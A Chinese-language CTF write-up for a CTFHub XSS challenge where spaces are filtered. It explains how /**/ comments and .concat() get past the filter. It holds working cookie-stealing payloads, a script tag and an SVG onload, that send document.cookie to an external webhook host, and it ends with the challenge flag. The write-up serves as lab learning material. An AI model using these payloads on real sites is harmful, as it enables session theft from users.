---
title: CTFHub-XSS-过滤空格 Writeup
date: 2026-10-03
category: web
tags: [CTFHub, XSS, 过滤空格]
---
## 题目描述

靶场接收用户输入的名字，将输入直接渲染到页面HTML中；后端过滤掉所有空格字符，需要构造不带空格的XSS Payload，窃取Bot的Cookie。

## 踩坑记录

1. ❌ 最初使用location.href跳转：Bot跳转到hook0外部域名，跨域，无法读取原页面Cookie，拿到的请求?c=参数永远为空。

2. ❌ 使用+做字符串拼接：payload放在URL的name=参数中，+会被URL编码转换成空格，JS语法报错，Cookie拼接失败。
✅ 解决方案：使用.concat()代替加号拼接字符串，消除+；使用图片请求/script外部加载，不跳转页面，同域读取Cookie。
Payload
<script/**/src=https://play.hook0.com/in/c_X1kgO6bQt0igNdGntGhnpUJzdRr/?c=.concat(document.cookie)></script>
• /**/：替代空格，绕过题目空格过滤

• src：引入外部资源，执行JS

• .concat(document.cookie)：拼接Cookie到url参数，不使用加号，规避URL编码破坏JS
备选SVG payload（测试用）
<svg/**/onload=new/**/Image().src='https://play.hook0.com/in/c_X1kgO6bQt0igNdGntGhnpUJzdRr/?c='.concat(document.cookie)>

## 利用步骤

1. 在靶场 What's your name 输入框，粘贴上面的payload，提交，页面返回Successfully。

2. 复制浏览器地址栏完整靶场URL（形如http://challenge-xxxx.sandbox.ctfhub.com:10800/?name=payload）。

3. 将完整URL粘贴到页面下方Send URL to Bot输入框，点击Send，让Bot访问注入了XSS的页面。

4. Bot打开页面，触发XSS，执行JS，发起GET请求访问Hook0地址，Cookie拼接到?c=参数。

## 原理总结

1. 过滤空格 → 使用/**/注释替代空格，HTML解析器会把注释当成空白分隔符。

2. 注入<script>标签，加载外部地址，执行JS。

3. .concat()方法拼接字符串，避开+号被URL编码转空格的坑。

4. 同域发起请求，成功读取document.cookie并带出到Webhook

5. 在Hook0的请求记录中，查看Query参数c的值，即为flag。

## Flag
ctfhub{fb1127ef5e3f33d833ce4783}


